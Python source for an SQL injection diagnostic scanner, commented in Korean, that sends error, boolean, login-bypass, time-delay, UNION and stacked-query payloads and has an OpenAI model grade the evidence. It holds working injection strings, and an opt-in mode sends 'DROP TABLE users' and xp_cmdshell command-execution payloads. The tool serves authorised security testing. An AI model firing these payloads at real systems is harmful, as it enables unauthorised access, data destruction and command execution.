"""
sqli_scanner.py
================
SQL Injection 취약점 자동 진단 도구
(진단 로직 + 생성형 AI 판정 + JSON 결과 저장까지 단일 파일)

설계 원칙:
  - "사실 수집"(요청 전송, 응답 시간 측정, 에러 메시지 확인 등)은 코드가 직접
    수행한다 — 이건 관찰이지 판단이 아니므로 결정론적으로 유지한다.
  - 그 관찰 결과(raw evidence)를 생성형 AI(OpenAI GPT)에 넘겨서
    status/risk/confidence/reason/recommendation을 최종 판정하도록 한다.
  - API 키가 없거나 호출이 실패하면 안전하게 status="N/A"로 폴백한다
    (스캔 자체가 죽지 않도록).

status      : "양호" | "취약" | "N/A"
risk        : "낮음" | "중간" | "높음"
confidence  : "확정" | "추정" | "판단불가"
tested_at   : 진단 수행 시각 (ISO 8601)
"""

from __future__ import annotations

import argparse
import json
import os
import re
import time
from datetime import datetime
from typing import Optional
from urllib.parse import urlsplit, parse_qs

import requests

try:
    from dotenv import load_dotenv
    load_dotenv()  # 같은 폴더의 .env 파일에서 OPENAI_API_KEY 등을 환경변수로 불러옴
except ImportError:
    pass

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None

VALID_STATUSES = ("양호", "취약", "N/A")
VALID_RISKS = ("낮음", "중간", "높음")
VALID_CONFIDENCE = ("확정", "추정", "판단불가")

DEFAULT_AI_MODEL = "gpt-4o-mini"


def make_result(vulnerability: str, status: str, risk: str, evidence: str,
                 reason: str, recommendation: str,
                 parameter: Optional[str] = None, payload: Optional[str] = None,
                 confidence: str = "확정") -> dict:
    assert status in VALID_STATUSES, f"잘못된 status: {status}"
    assert risk in VALID_RISKS, f"잘못된 risk: {risk}"
    assert confidence in VALID_CONFIDENCE, f"잘못된 confidence: {confidence}"
    return {
        "vulnerability": vulnerability,
        "status": status,
        "risk": risk,
        "evidence": evidence,
        "reason": reason,
        "recommendation": recommendation,
        "parameter": parameter,
        "payload": payload,
        "confidence": confidence,
        "tested_at": datetime.now().isoformat(),
    }


# --------------------------------------------------------------------------- #
# 생성형 AI 판정 헬퍼
# --------------------------------------------------------------------------- #

AI_SYSTEM_PROMPT = (
    "당신은 웹 애플리케이션 보안 진단 결과를 판정하는 보조 도구입니다. "
    "제공된 '관찰된 사실(raw observation)'에 근거해서만 판정하고, 사실에 없는 내용을 "
    "추측하거나 지어내지 않습니다. "
    "특히 evidence 필드를 작성할 때는 관찰된 사실에 있는 모든 수치(응답시간, 상태코드, "
    "바이트 수, 컬럼 개수 등)와 문자열(에러 메시지, 페이로드 등)을 정확한 값 그대로 "
    "포함해야 합니다. '매우 심각한 지연', '약간의 차이' 같은 정성적 표현으로 수치를 "
    "대체하지 마세요. 예를 들어 관찰된 사실에 '5.00초 지연'이 있으면 evidence에도 "
    "반드시 '5.00초'라는 숫자를 그대로 써야 하며, '심각한 지연이 확인됨'처럼 숫자를 "
    "생략한 표현으로 바꿔쓰면 안 됩니다. "
    "문체는 보안 진단 보고서에서 쓰는 극도로 압축된 개조식(명사형/구 단위 종결)입니다. "
    "완결된 존댓말 문장('~습니다', '~해요', '~됩니다', '~할게요')을 절대 쓰지 말고, "
    "짧은 명사구를 마침표로 나열하는 형식으로 작성합니다. 아래는 실제로 따라야 할 스타일 예시입니다:\n"
    '  "evidence": "GET 입력 지점 3개, payload 5개, 총 7회 검증, alert 성공 2회, 실행 지점 2개, 브라우저 오류 0건."\n'
    '  "reason": "출력 인코딩 누락에 따른 스크립트 반사 실행. 컨텍스트 검증 부재 정황."\n'
    '  "recommendation": "컨텍스트 기반 출력 인코딩 및 HTML 이스케이프 적용. CSP 설정 강화 및 위험 스크립트 패턴 차단."\n'
    "이처럼 '~했습니다' 대신 '~함' 또는 명사만, '차단했습니다' 대신 '차단' 또는 '차단 필요'처럼 "
    "동사 종결어미를 전부 제거하고 명사/명사구로 끝맺으세요. 문장은 마침표로 구분된 여러 개의 "
    "짧은 구로 쪼개도 됩니다. "
    "특히 부정 표현('미확인', '실패', '없음')과 긍정 표현('확인됨', '성공', '노출됨')을 "
    "절대 뒤바꾸지 않도록 각별히 주의합니다 — 예를 들어 관찰된 사실이 '~미확인'이면 "
    "이는 해당 시도가 실패했다는 뜻이지 성공했다는 뜻이 아닙니다. "
    "반드시 지정된 JSON 형식으로만 응답합니다."
)


def _extract_numbers(text: str) -> list:
    """문자열에서 숫자(소수점 포함)만 뽑아낸다. evidence의 수치 보존 검증용."""
    return re.findall(r"\d+\.?\d*", text)


def get_openai_client(api_key: Optional[str]):
    """
    API 키/패키지 문제를 원인별로 구분해서 (client, reason) 형태로 반환한다.
    client가 None이면 reason에 실패 원인이 담긴다.
    """
    if OpenAI is None:
        return None, "openai 패키지가 설치되어 있지 않습니다 (pip install openai 필요)"
    key = api_key or os.environ.get("OPENAI_API_KEY")
    if not key:
        return None, "OPENAI_API_KEY를 찾을 수 없습니다 (.env 파일 또는 --openai-api-key 확인 필요)"
    try:
        return OpenAI(api_key=key), None
    except Exception as e:
        return None, f"OpenAI 클라이언트 초기화 실패: {e}"


def ai_judge(client, vulnerability: str, technical_evidence: str,
             parameter: Optional[str], payload: Optional[str],
             model: str = DEFAULT_AI_MODEL) -> dict:
    """
    규칙 기반 코드가 실제로 관찰한 사실(technical_evidence)만 근거로,
    생성형 AI가 evidence/status/risk/confidence/reason/recommendation을 모두 판정한다.
    client가 None이면(API 키 미설정 등) 안전하게 N/A로 폴백한다.

    evidence는 AI가 자연스럽게 다시 쓰되, 관찰된 사실에 있던 숫자가 하나라도
    누락되면(왜곡/생략 위험) 신뢰성을 위해 원본 관찰 사실 문자열로 되돌린다.
    """
    if client is None:
        return make_result(
            vulnerability=vulnerability, status="N/A", risk="중간",
            evidence=technical_evidence,
            reason="OPENAI_API_KEY가 설정되지 않아(또는 openai 패키지 미설치) AI 판정을 수행할 수 없음",
            recommendation="'.env' 파일에 OPENAI_API_KEY를 설정하거나 --openai-api-key 옵션 지정 후 재실행 필요",
            parameter=parameter, payload=payload, confidence="판단불가",
        )

    user_prompt = f"""다음은 웹 취약점 자동 진단 중 실제로 수집된 관찰 결과(raw observation)입니다.
이 사실만 근거로 판정하세요. 사실에 없는 내용을 지어내지 마세요.

취약점명: {vulnerability}
파라미터: {parameter}
사용한 페이로드: {payload}
관찰된 사실(raw observation): {technical_evidence}

아래 JSON 형식으로만 응답하세요:
{{
  "evidence": "관찰된 사실을 자연스러운 문장으로 재구성한 근거 서술 (수치/문자열은 원본 그대로 보존)",
  "status": "양호" 또는 "취약" 또는 "N/A",
  "risk": "낮음" 또는 "중간" 또는 "높음",
  "confidence": "확정" 또는 "추정" 또는 "판단불가",
  "reason": "판정 근거 (개조식, 명사구 나열)",
  "recommendation": "보안 대응방안 (개조식, 명사구 나열)"
}}

판정 기준:
- 관찰된 사실이 명확한 취약점 증거(에러 메시지 노출, 인증 우회 성공, 실제 지연/데이터 변경 확인 등)면 status=취약, confidence=확정
- 간접적 근거(응답 길이 차이 등)만 있으면 confidence=추정
- 판단할 근거 자체가 부족하거나 요청이 실패했으면 status=N/A, confidence=판단불가
- evidence의 모든 수치(초, 상태코드, 바이트, 컬럼 개수 등)는 관찰된 사실에 있는 값 그대로 표기 (정성적 표현으로 대체 금지)
"""

    try:
        resp = client.chat.completions.create(
            model=model,
            temperature=0,
            response_format={"type": "json_object"},
            messages=[
                {"role": "system", "content": AI_SYSTEM_PROMPT},
                {"role": "user", "content": user_prompt},
            ],
        )
        parsed = json.loads(resp.choices[0].message.content)

        status = parsed.get("status")
        risk = parsed.get("risk")
        confidence = parsed.get("confidence")
        reason = parsed.get("reason") or "AI가 판정 근거를 반환하지 않음"
        recommendation = parsed.get("recommendation") or ""
        ai_evidence = parsed.get("evidence") or technical_evidence

        if status not in VALID_STATUSES or risk not in VALID_RISKS or confidence not in VALID_CONFIDENCE:
            raise ValueError(f"AI가 스키마에 없는 값을 반환함: {parsed}")

        # 신뢰성 안전장치: 원본 관찰 사실에 있던 숫자가 AI의 evidence에서 하나라도
        # 빠졌으면(수치 왜곡/누락 위험) 원본 관찰 사실 문자열로 그대로 되돌린다.
        original_numbers = set(_extract_numbers(technical_evidence))
        ai_numbers = set(_extract_numbers(ai_evidence))
        final_evidence = ai_evidence
        if not original_numbers.issubset(ai_numbers):
            final_evidence = technical_evidence
            reason = f"[AI 서술에서 수치 누락 감지되어 원본 관찰값으로 대체됨] {reason}"

        return make_result(
            vulnerability=vulnerability, status=status, risk=risk,
            evidence=final_evidence, reason=reason, recommendation=recommendation,
            parameter=parameter, payload=payload, confidence=confidence,
        )
    except Exception as e:
        return make_result(
            vulnerability=vulnerability, status="N/A", risk="중간",
            evidence=technical_evidence,
            reason=f"AI 판정 중 오류 발생: {e}",
            recommendation="재점검 필요",
            parameter=parameter, payload=payload, confidence="판단불가",
        )


# --------------------------------------------------------------------------- #
# 페이로드 정의
# --------------------------------------------------------------------------- #

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "warning: mysql",
    "unclosed quotation mark",
    "sqlstate",
    "sqlite3.operationalerror",
    "pg_query()",
    "syntax error",
    "conversion failed when converting",
    "unterminated string",
]

ERROR_PAYLOAD = "'"
BOOLEAN_TRUE_PAYLOADS = ["' OR '1'='1", "' OR 'a'='a"]
BOOLEAN_FALSE_PAYLOAD = "' AND '1'='2"

LOGIN_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "admin'-- ",
    '" OR ""="',
]

TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5)-- ",
    "'; WAITFOR DELAY '0:0:5'-- ",
    "' AND pg_sleep(5)-- ",
]
TIME_THRESHOLD_SEC = 4.5

UNION_MAX_COLUMNS = 8

STACKED_QUERY_PROBE_PAYLOADS = [
    "test'; SELECT SLEEP(5)-- ",
    "test'; WAITFOR DELAY '0:0:5'-- ",
    "test'; SELECT pg_sleep(5)-- ",
]

DESTRUCTIVE_PAYLOADS = [
    ("1; DROP TABLE users-- ", "Stacked Query를 통한 테이블 삭제 시도"),
    ("'; EXEC xp_cmdshell('whoami')-- ", "MSSQL 확장 저장 프로시저를 통한 명령 실행 시도"),
]


def _contains_sql_error(text: str) -> Optional[str]:
    lowered = text.lower()
    for sig in SQL_ERROR_SIGNATURES:
        if sig in lowered:
            return sig
    return None


# --------------------------------------------------------------------------- #
# 1. Error-based + Boolean-based
# --------------------------------------------------------------------------- #

def scan_get_param(client, session: requests.Session, url: str, param: str, model: str = DEFAULT_AI_MODEL) -> dict:
    vuln_name = "SQL Injection (Error/Boolean-based)"
    try:
        baseline = session.get(url, params={param: "test"}, timeout=5)
        error_resp = session.get(url, params={param: ERROR_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability=vuln_name, status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=ERROR_PAYLOAD, confidence="판단불가",
        )

    sig = _contains_sql_error(error_resp.text)
    if sig:
        evidence = f"페이로드 {ERROR_PAYLOAD!r} 입력 시 DB 에러 문구 노출: '{sig}' (status={error_resp.status_code})"
        return ai_judge(client, vuln_name, evidence, param, ERROR_PAYLOAD, model=model)

    try:
        true_responses = [session.get(url, params={param: p}, timeout=5) for p in BOOLEAN_TRUE_PAYLOADS]
        false_resp = session.get(url, params={param: BOOLEAN_FALSE_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability=vuln_name, status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="Boolean 기반 비교 요청 중 오류 발생",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=f"{'/'.join(BOOLEAN_TRUE_PAYLOADS)} / {BOOLEAN_FALSE_PAYLOAD}",
            confidence="판단불가",
        )

    baseline_len = len(baseline.text)
    for true_payload, true_resp in zip(BOOLEAN_TRUE_PAYLOADS, true_responses):
        len_diff = abs(len(true_resp.text) - len(false_resp.text))
        if len_diff > 20 and len_diff > baseline_len * 0.02:
            evidence = (f"참 조건({true_payload!r}) 응답 길이={len(true_resp.text)}, "
                        f"거짓 조건 응답 길이={len(false_resp.text)} (차이 {len_diff}byte, "
                        f"기준 응답 길이={baseline_len})")
            return ai_judge(client, vuln_name, evidence, param, f"{true_payload} / {BOOLEAN_FALSE_PAYLOAD}", model=model)

    evidence = (f"에러 메시지 미노출. 참/거짓 조건 응답 길이 차이 없음 "
                f"(기준={baseline_len}, 참={[len(r.text) for r in true_responses]}, 거짓={len(false_resp.text)})")
    return ai_judge(client, vuln_name, evidence, param, f"{ERROR_PAYLOAD} / {'/'.join(BOOLEAN_TRUE_PAYLOADS)}", model=model)


# --------------------------------------------------------------------------- #
# 2. 로그인 인증 우회
# --------------------------------------------------------------------------- #

def scan_login_form(client, session: requests.Session, url: str, id_param: str, pw_param: str,
                     success_indicator: str, model: str = DEFAULT_AI_MODEL) -> dict:
    vuln_name = "SQL Injection - 로그인 인증 우회"
    for payload in LOGIN_BYPASS_PAYLOADS:
        try:
            resp = session.post(
                url, data={id_param: payload, pw_param: "anything"},
                timeout=5, allow_redirects=True,
            )
        except Exception as e:
            return make_result(
                vulnerability=vuln_name, status="N/A", risk="높음",
                evidence=f"요청 실패: {e}",
                reason="로그인 요청을 정상적으로 보낼 수 없어 판정 불가",
                recommendation="로그인 엔드포인트/파라미터명 확인 후 재점검 필요",
                parameter=id_param, payload=payload, confidence="판단불가",
            )

        bypassed = (
            success_indicator.lower() in resp.text.lower()
            or success_indicator.lower() in resp.url.lower()
        )
        if bypassed:
            evidence = f"페이로드 {payload!r} 입력 시 성공 지표('{success_indicator}')가 응답/URL에서 확인됨 (최종 URL: {resp.url})"
            return ai_judge(client, vuln_name, evidence, id_param, payload, model=model)

    evidence = f"시도한 인증 우회 페이로드 {len(LOGIN_BYPASS_PAYLOADS)}종 모두 성공 지표('{success_indicator}') 미확인"
    return ai_judge(client, vuln_name, evidence, id_param, ", ".join(LOGIN_BYPASS_PAYLOADS), model=model)


# --------------------------------------------------------------------------- #
# 3. Time-based Blind SQLi
# --------------------------------------------------------------------------- #

def scan_time_based(client, session: requests.Session, url: str, param: str, model: str = DEFAULT_AI_MODEL) -> dict:
    vuln_name = "SQL Injection (Time-based Blind)"
    try:
        baseline_start = time.monotonic()
        session.get(url, params={param: "test"}, timeout=10)
        baseline_elapsed = time.monotonic() - baseline_start
    except Exception as e:
        return make_result(
            vulnerability=vuln_name, status="N/A", risk="중간",
            evidence=f"기준 응답 시간 측정 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=None, confidence="판단불가",
        )

    for payload in TIME_BASED_PAYLOADS:
        try:
            start = time.monotonic()
            session.get(url, params={param: payload}, timeout=10)
            elapsed = time.monotonic() - start
        except requests.exceptions.Timeout:
            evidence = f"페이로드 {payload!r} 입력 시 요청이 타임아웃(10초 초과)됨 (기준 응답 시간 {baseline_elapsed:.2f}초)"
            return ai_judge(client, vuln_name, evidence, param, payload, model=model)
        except Exception:
            continue

        if elapsed - baseline_elapsed >= TIME_THRESHOLD_SEC:
            evidence = f"페이로드 {payload!r} 입력 시 응답 시간 {elapsed:.2f}초 (기준 {baseline_elapsed:.2f}초 대비 {elapsed - baseline_elapsed:.2f}초 지연)"
            return ai_judge(client, vuln_name, evidence, param, payload, model=model)

    evidence = f"기준 응답 시간 {baseline_elapsed:.2f}초, 지연 페이로드 {len(TIME_BASED_PAYLOADS)}종 모두 유의미한 지연 없음"
    return ai_judge(client, vuln_name, evidence, param, "/".join(TIME_BASED_PAYLOADS))


# --------------------------------------------------------------------------- #
# 4. UNION-based SQLi
# --------------------------------------------------------------------------- #

def scan_union_based(client, session: requests.Session, url: str, param: str,
                      max_columns: int = UNION_MAX_COLUMNS, model: str = DEFAULT_AI_MODEL) -> dict:
    vuln_name = "SQL Injection (UNION-based)"
    try:
        baseline = session.get(url, params={param: "test"}, timeout=5)
        error_resp = session.get(url, params={param: ERROR_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability=vuln_name, status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=None, confidence="판단불가",
        )

    baseline_had_error = _contains_sql_error(error_resp.text) is not None

    for n in range(1, max_columns + 1):
        payload = f"' UNION SELECT {','.join(['NULL'] * n)}-- "
        try:
            resp = session.get(url, params={param: payload}, timeout=5)
        except Exception:
            continue

        has_error = _contains_sql_error(resp.text) is not None
        if baseline_had_error and not has_error and resp.status_code == baseline.status_code:
            evidence = f"컬럼 {n}개로 맞춘 UNION SELECT 페이로드 응답 시 에러 없이 정상 응답(status={resp.status_code})으로 전환됨 (기준 status={baseline.status_code}, 원본 에러 존재={baseline_had_error})"
            return ai_judge(client, vuln_name, evidence, param, payload, model=model)

    evidence = f"컬럼 1~{max_columns}개 범위의 UNION SELECT 시도 중 정상 응답으로 전환되는 지점 없음"
    return ai_judge(client, vuln_name, evidence, param, f"UNION SELECT NULL (x1~{max_columns})", model=model)


# --------------------------------------------------------------------------- #
# 5. 스택 쿼리(다중 SQL문) 실행 가능 여부 - 데이터 변경 없이 안전하게 검증
# --------------------------------------------------------------------------- #

def scan_stacked_query(client, session: requests.Session, url: str, param: str, model: str = DEFAULT_AI_MODEL) -> dict:
    vuln_name = "SQL Injection (Stacked Query 실행 가능 여부)"
    try:
        baseline_start = time.monotonic()
        session.get(url, params={param: "test"}, timeout=10)
        baseline_elapsed = time.monotonic() - baseline_start
    except Exception as e:
        return make_result(
            vulnerability=vuln_name, status="N/A", risk="중간",
            evidence=f"기준 응답 시간 측정 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=None, confidence="판단불가",
        )

    for payload in STACKED_QUERY_PROBE_PAYLOADS:
        try:
            start = time.monotonic()
            session.get(url, params={param: payload}, timeout=10)
            elapsed = time.monotonic() - start
        except requests.exceptions.Timeout:
            evidence = f"페이로드 {payload!r}(세미콜론으로 이어붙인 읽기전용 SLEEP) 입력 시 요청이 타임아웃(10초 초과)됨"
            return ai_judge(client, vuln_name, evidence, param, payload, model=model)
        except Exception:
            continue

        if elapsed - baseline_elapsed >= TIME_THRESHOLD_SEC:
            evidence = f"페이로드 {payload!r}(세미콜론으로 이어붙인 읽기전용 SLEEP) 입력 시 응답 시간 {elapsed:.2f}초 (기준 {baseline_elapsed:.2f}초 대비 지연)"
            return ai_judge(client, vuln_name, evidence, param, payload, model=model)

    evidence = f"기준 응답 시간 {baseline_elapsed:.2f}초, 스택 쿼리 SLEEP 페이로드 {len(STACKED_QUERY_PROBE_PAYLOADS)}종 모두 지연 없음"
    return ai_judge(client, vuln_name, evidence, param, "/".join(STACKED_QUERY_PROBE_PAYLOADS))


# --------------------------------------------------------------------------- #
# 6. 파괴적 페이로드 (기본 비활성, opt-in)
# --------------------------------------------------------------------------- #

def scan_destructive(client, session: requests.Session, url: str, param: str, model: str = DEFAULT_AI_MODEL) -> list:
    results = []
    for payload, desc in DESTRUCTIVE_PAYLOADS:
        vuln_name = f"SQL Injection (파괴적 페이로드 - {desc})"
        try:
            resp = session.get(url, params={param: payload}, timeout=10)
            error_found = _contains_sql_error(resp.text)
            evidence = (
                f"페이로드 전송 완료(status={resp.status_code}, "
                f"에러 문구 {'노출됨: ' + error_found if error_found else '미노출'}). "
                "응답만으로는 실제 테이블 삭제/명령 실행 여부를 확정할 수 없음(DB 직접 확인 필요)"
            )
            results.append(ai_judge(client, vuln_name, evidence, param, payload, model=model))
        except Exception as e:
            results.append(make_result(
                vulnerability=vuln_name, status="N/A", risk="높음",
                evidence=f"요청 실패: {e}",
                reason="대상에 정상적으로 접근할 수 없어 판정 불가",
                recommendation="네트워크/URL 확인 후 재점검 필요",
                parameter=param, payload=payload, confidence="판단불가",
            ))
    return results


# --------------------------------------------------------------------------- #
# 실행 취합
# --------------------------------------------------------------------------- #

def run_all(client, base_url: str, search_path: str, search_param: str,
            login_path: str, id_param: str, pw_param: str,
            success_indicator: str, allow_destructive: bool = False,
            model: str = DEFAULT_AI_MODEL) -> list:
    results = []

    s1 = requests.Session()
    results.append(scan_get_param(client, s1, base_url.rstrip("/") + search_path, search_param, model))

    s2 = requests.Session()
    results.append(scan_login_form(client, s2, base_url.rstrip("/") + login_path, id_param, pw_param, success_indicator, model))

    s3 = requests.Session()
    results.append(scan_time_based(client, s3, base_url.rstrip("/") + search_path, search_param, model))

    s4 = requests.Session()
    results.append(scan_union_based(client, s4, base_url.rstrip("/") + search_path, search_param, model=model))

    s5 = requests.Session()
    results.append(scan_stacked_query(client, s5, base_url.rstrip("/") + search_path, search_param, model))

    if allow_destructive:
        s6 = requests.Session()
        results.extend(scan_destructive(client, s6, base_url.rstrip("/") + search_path, search_param, model))

    return results


# --------------------------------------------------------------------------- #
# CLI 진입점
# --------------------------------------------------------------------------- #

def main():
    parser = argparse.ArgumentParser(description="SQL Injection 취약점 자동 진단 도구 (AI 판정)")
    parser.add_argument("--url", default=None,
                         help="[간편 모드] 검색 결과 등 파라미터가 붙은 URL을 통째로 붙여넣으면 "
                              "base-url/search-path/search-param을 자동으로 뽑아냄.")
    parser.add_argument("--base-url", default="http://localhost:8081")
    parser.add_argument("--search-path", default="/inquiry/list.php")
    parser.add_argument("--search-param", default="keyword")
    parser.add_argument("--login-path", default="/auth/login.php")
    parser.add_argument("--id-param", default="id")
    parser.add_argument("--pw-param", default="pw")
    parser.add_argument("--success-indicator", default="환영합니다",
                         help="로그인 성공 시 응답/URL에 포함되는 문자열")
    parser.add_argument("--allow-destructive", action="store_true",
                         help="[주의] DROP TABLE, xp_cmdshell 등 파괴적 페이로드까지 실행. "
                              "반드시 진단 권한이 있는 자체 구축 테스트 환경에서만 사용할 것")
    parser.add_argument("--openai-api-key", default=None,
                         help="OpenAI API 키. 생략 시 환경변수 OPENAI_API_KEY 사용")
    parser.add_argument("--ai-model", default=DEFAULT_AI_MODEL)
    parser.add_argument("--output", default="sqli_scan_result.json")
    args = parser.parse_args()

    if args.url:
        parsed = urlsplit(args.url)
        args.base_url = f"{parsed.scheme}://{parsed.netloc}"
        args.search_path = parsed.path
        query_params = parse_qs(parsed.query)
        if query_params:
            args.search_param = next(iter(query_params))
        else:
            print("⚠️  --url에 '?파라미터=값' 형태가 없어서 search-param을 자동으로 알아낼 수 없습니다.")
        print(f"🔎 --url 자동 분석: base-url={args.base_url}, search-path={args.search_path}, search-param={args.search_param}")

    if args.allow_destructive:
        print("⚠️  --allow-destructive 옵션이 켜져 있습니다. DROP TABLE / xp_cmdshell 페이로드를 실제로 전송합니다.")
        print("    진단 권한이 있는 자체 테스트 환경이 맞는지, DB 백업을 해뒀는지 다시 한 번 확인하세요.")

    client, client_error = get_openai_client(args.openai_api_key)
    if client is None:
        print(f"⚠️  AI 판정을 사용할 수 없어 모든 판정이 N/A로 처리됩니다. 원인: {client_error}")
    else:
        print(f"🤖 AI 판정 모델: {args.ai_model}")

    results = run_all(
        client=client,
        base_url=args.base_url,
        search_path=args.search_path,
        search_param=args.search_param,
        login_path=args.login_path,
        id_param=args.id_param,
        pw_param=args.pw_param,
        success_indicator=args.success_indicator,
        allow_destructive=args.allow_destructive,
        model=args.ai_model,
    )

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    print(f"총 {len(results)}개 항목 진단 완료 -> {args.output} 저장")
    for r in results:
        print(f"- [{r['status']}/{r['risk']}/{r['confidence']}] {r['vulnerability']}")


if __name__ == "__main__":
    main()
